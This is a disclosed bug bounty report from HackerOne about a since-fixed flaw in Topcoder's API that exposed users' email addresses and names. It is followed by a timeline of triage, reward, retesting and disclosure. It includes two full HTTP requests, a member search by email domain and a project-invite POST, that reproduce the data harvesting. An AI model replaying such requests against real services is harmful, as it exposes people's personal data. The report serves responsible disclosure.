---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/information-disclosure
  - env/web
substate: "resolved"
weakness: "Information Disclosure"
enriched: true
date: 2020-04-13
submitted: 2020-02-03T03:58:18.179Z
bounty_usd: null
votes: 54
cve: []
program: "[[programs/lab45|Lab45]]"
reporter: "bonikia97"
source: "https://hackerone.com/reports/787955"
title: "PII of Users Disclosure using '/members/invite/' endpoint"
---
# PII of Users Disclosure using "/members/invite/" endpoint

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 54 | **Program:** Lab45 | **Disclosed:** 2020-04-13

- Report: [https://hackerone.com/reports/787955](https://hackerone.com/reports/787955)
- CWE: Information Disclosure
- Submitted: 2020-02-03T03:58:18.179Z

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2020-02-03** @bonikia97: Collect userIds with @wearehackerone.com domains.

```
GET /v3/members/_search/?fields=userId%2Chandle%2CphotoURL%2CfirstName%2ClastName%2Cdetails%2Cemail&query=email%3A@wearehackerone.com&limit=1000 HTTP/1.1
Host: api.topcoder.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/plain, */*
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Authorization: █████████
Origin: https://connect.topcoder.com
Connection: close
Referer: https://connect.topcoder.com/projects/13482/
```

Collect users email: 

```
POST /v5/projects/13482/members/invite/?fields=id%2CprojectId%2CuserId%2Cemail%2Crole%2Cstatus%2CcreatedAt%2CupdatedAt%2CcreatedBy%2CupdatedBy%2Chandle%2CfirstName%2ClastName%2CphotoURL HTTP/1.1
Host: api.topcoder.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/plain, */*
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Authorization: █████████
Content-Length: 70
Origin: https://connect.topcoder.com
Connection: close
Referer: https://connect.topcoder.com/projects/13482/

{"userIds":[41008482, 41008483, 41008486, 41012377],"role":"customer"}
```
- **Report Title Updated**
- **Report Severity Updated**
- **Report Triaged**
- **2020-02-05** @jwheeler: @bonikia97 Great find! Thanks for your submission. Topcoder would like to reward you for this finding. Can you sign up at topcoder.com and provide me your handle?
- **2020-02-05** @bonikia97: Hey, thank you very much. It is a pleasure to make your application safer, and learn along the way. My real TopCoder user is, https://www.topcoder.com/members/juanbonino97. The others were used to do the testing.

Regards!
- **2020-02-05** @bonikia97: Hey @jwheeler, thank you very much. It is a pleasure to make the application safer, and learn along the way. My real TopCoder user is, https://www.topcoder.com/members/juanbonino97. The others were used to do the testing.

Regards!
- **2020-02-11** @jwheeler: @bonikia97 the Topcoder support team will reach out to shortly with instructions on claiming your reward.
- **2020-02-11** @bonikia97: @jwheeler Good morning! Okey, thanks :) Regards
- **2020-02-21** @bonikia97: @jwheeler Hello!

Thanks for the reward!!

Any update on the report?

Regards!
- **2020-02-21** @jwheeler: The development team is aware of the issue. I don't have a fix date yet.
- **2020-03-25** @jwheeler: @bonikia97 can you test the 2nd part of this? The POST to /v5/projects/....
- **2020-03-27** @bonikia97: @jwheeler 

Hello, good morning. Now its working finee.

The problem was fixed.

Regards.
- **2020-03-27** @jwheeler: @bonikia97 Outstanding! Thanks for testing. I'm going to close this.
- **Report Resolved**
- **Agreed On Going Public**
- **2020-03-29** @bonikia97: @jwheeler 

Thank you very much for your feedback in my profile!

I appreciate it too much. 

Thank you.
- **2020-04-12** @bonikia97: Hi @jwheeler, can we disclose this? :) 

Regards
- **Agreed On Going Public**
- **Report Became Public**
